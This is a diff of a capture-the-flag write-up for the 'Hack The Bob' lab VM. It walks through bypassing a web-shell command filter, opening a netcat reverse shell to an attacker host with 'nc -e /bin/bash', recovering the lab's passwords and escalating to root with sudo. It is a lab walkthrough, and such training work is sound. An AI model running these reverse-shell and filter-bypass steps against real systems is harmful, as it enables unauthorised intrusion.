@@ -19,7 +19,7 @@ The walkthrough [Hack The Bob: 1.0.1](https://www.hackingarticles.in/hack-the-bo
 
 - [**Discovery**](#discovery) &rightarrow; network scanning and services enumeration
 - [**Initial Access**](#initial-access) &rightarrow; expoit RCE vulnerability on web application
-- [**Execution**](exe) &rightarrow; establish reverse shell using netcat
+- [**Execution**](#execution) &rightarrow; establish reverse shell using netcat
 - [**Credential Access**](cre) &rightarrow; abuse of legitimate credentials stored unsecurely in the machine
 - [**Privilege Escalation**](pri) &rightarrow; abuse of valid accounts with high privileges
 
@@ -55,8 +55,8 @@ The result of `nmap` command is shown in the following screenshot.
 ![1](images/nmap.png)
 
 Notable things:
-- there is a web server is active on port 80 
-- there is an SSH server listening on port 25468
+- there is a web server is active on port 80, this server has an RCE vulnerability exploitable without authentication
+- there is an SSH server listening on port 25468 
 
 For convenience, this IP address is added to the file `/etc/hosts` on the Kali machine and linked to the name "hackthebob".
 
@@ -71,84 +71,67 @@ However, upon closer analysis of `nmap` output detailing the web server, it beco
 Examining its contents, four entries stand out as disallowed `/login.php`, `/passwords.html`, `/lat_memo.html` and `/dev_shell.php`. These names are interesting names, but further investigation reveals that only the page `http://hackthebob/dev_shell.php` is worthy: it appears to be a web shell, suggesting a potential entry point for a possible exploration.
 
 ### Initial Access
-
-The first action is to test some basic `bash` commands to examine how the server reacts.
+The first action is to test some basic bash commands to examine how the server reacts.
 
 It appears that there's some internal block or filter in place, because commands such as `ls` or `pwd` display an error message, while the `id` command provides a coherent output.
 
-By attempting the command `id | ls ` it became possible to list files. This strategy of nested commands can bypass the filter exploiting the fact that `id` takes in input `ls` so that is possible to circumvent the filter.
-
-By attempting the command `id | ls`, it becomes apparent that nesting commands can bypass the filter. This strategy exploits the fact that id accepts ls as input, enabling circumvention of the restriction.
-
-![secondo screen](images/dev.png)
+By attempting the command `id | ls` it became possible to list files. This strategy of nested commands can bypass the filter exploiting the fact that `ls` takes in input `id` output so that is possible to circumvent the filter.
 
 
-Now downloading with `curl` command `dev_shell.txt.bak` file, that is backup file of `de_shell.php`, it is possible to see the reason why the other commands disn't work
+![3](images/dev.png)
 
-![terzo](images/blocked.png)
 
-It is time now to establish a netcat connection thorugh the web shell and the Kali machine. This is done using netcat 
+Now downloading with `curl` command `dev_shell.txt.bak` file, that is probably the backup file of `dev_shell.php`, it is possible to see the reason why the other commands didn't work.
 
-- on Kali side the command 
-``` nc -lvp 6000``` was runned, so the Kali machine is now listening on port 6000 for connection requests
-- on the web interface of the target the command `id | nc -e /bin/bash 10.0.2.6 6000` was runned 
+![4](images/blocked.png)
 
-In order to spawn a better shell on kali terminal the command 
+### Execution
+It is time now to establish a connection through the web shell and the Kali machine. This is done using Netcat which is a command line tool for remote communication over TCP connections
+
+- on Kali side the command `nc -lvp 6000` is ran, so the Kali machine is now listening on port 6000 for connection requests: this is the server side of the future TCP connection
+- on the web interface of the target, command `id | nc -e /bin/bash 10.0.2.6 6000` is ran: this will be the client side of the TCP connection.
+
+The spawned shell is a basic `sh` shell, so in order to have a more versatile and powerful shell, on the server side of the connection the following text line is written
 
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-was used. The current account is `www-data`.
+- `python -c` indicates the fact that the command following is executed by command line
+- `import pty;pty.spawn("/bin/bash")` imports a Python library and calls a function that spawns a bash shell
 
-Moving to the root directory of the file system and listing files it is possible to see the `flag.txt` file. 
-Running `ls -l` shows that in order to open `flag.txt` it needs to be root account because it is the legitimate owner.
+Now it is possible to look around and move in the file system of `Bob: 1.0.1` machine looking for some interesting things. The current account is `www-data`, but it is needed to gain higher privileges to complete the challenge, in fact moving to the root directory of the file system and listing files with `ls -l` command it is possible to see that the `flag.txt` file can be opened only by root account because it is the legitimate owner.
 
-In the `/home` directory there are four other directories with person names. In the first one, on path `/home/bob/Documents` there are a gpg file `login.txt.gpg` and another directory "Secret".
+In the `/home` directory there are four other directories with person names  (bob, elliot, jc, seb). In the first one, on path `/home/bob/Documents` there are an encrypted file with name `login.txt.gpg` and another directory named "Secret".
 
-On path `/home/bob/Documents/Secret/Keep_Out/No_Lookie_In_Here` there is a script `notes.sh`: executing it the output is a list of apparently no sense phrases 
+On path `/home/bob/Documents/Secret/Keep_Out/No_Lookie_In_Here` there is a script `notes.sh`: executing it the output is a list of apparently no sense phrases.
+This output seams to have no meaning, but taking the first letter of each line the word HARPOCRATES is composed (this is the name of an Egyptian divinity), maybe it is the passphrase for the encrypted file.
 
+All steps from the netcat connection establishment to this point are shown in the following screenshot
 
+![5](images/harpo.png)
 
+Now it's needed to change account in order to decrypt `login.txt.gpg` bacause the current account `www-data` is not allowed.
 
-```
-Harry Potter is my favourite
-Are you real me?
-Right, I’m ordering pizza this is going nowhere
-People just don’t get me
-Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>
-Cucumber
-Rest now your eyes are sleepy
-Are you gonna stop reading this yet?
-Time to fix the server
-Everyone is annoying
-Sticky notes gotta buy em
-```
-![quattro](images/harpo.png)
+In `/home/elliot` there is a file, `theadminisdumb.txt`, that contains a long text with embedded two user's password. 
+Stando a questo file elliot's account has password 'theadminisdumb' while the jc' one has password 'Qwerty'.
 
-This output seams to have no meaning, but taking the first letter of each line the word HARPOCRATES is composed (this is the name of an egyptian divinity), maybe it is the passphrase for the gpg file.
-
-Now it's needed to change account in order to decypt the gpg file 
-
-In `/home/elliot` there is a file `theadminisdumb.txt` that contains a long text with embedded to user's password. 
-Account elliot has password "theadminisdumb" while account jc has password Qwerty
-
-With command `su elliot` and typeing his password the current account change to elliot: he has permission for decrypting the gpg
-
-
+To test this information, command `su elliot` is ran and, after inserting his password, the current account changes to elliot's one. Then it turns out that he has permission for decrypting the `.gpg` file, so the following command is ran for attempting decryption.
 
 ```bash
 gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
 ```
+Decryption succeeded thanks to the right passphrase.
+Having the file in clear it is possible to read Bob's password which is 'b0bcat_'.
 
-is the command for the decryption. Having the file in clear it is possible to read bob's password which is "b0bcat_"
+All the steps citati are shown in the following screenshot.
 
-![5](images/elliot.png)
+![6](images/elliot.png)
 
-Now it is possible to change account again and impersonate bob. Salta fuori that Bob is a superuser with root privileges
+So now it is possible to change account again and impersonate Bob. Salta fuori that Bob is a user with root privileges (while Elliot did not)
 
-Important to notice that Bob is not the owner of the file flag.txt, so it is not possible yet to capture the flag, but since bob is a superuser, running just `sudo su` it is possible to became root account, caputure the flag and conclude the challenge.
+It is important to notice that Bob is not the owner of the file flag.txt, so it is not possible yet to capture the flag, but since Bob is a superuser, running just `sudo su` it is possible to became root account, this allow to capture the flag and conclude the challenge.
 
-![6](images/root.png)
+![7](images/root.png)
 
 A large set of credentials assure persistence over this web server, but it is also notable, from the utput of nmap command, that there is another server running on the machine
 
@@ -157,7 +140,7 @@ I tryed to connect with hackthebob on bob account via SSH
 i didn't have to interrract via browser
 
 
-![6](images/ssh.png)
+![8](images/ssh.png)
 
 
 fine
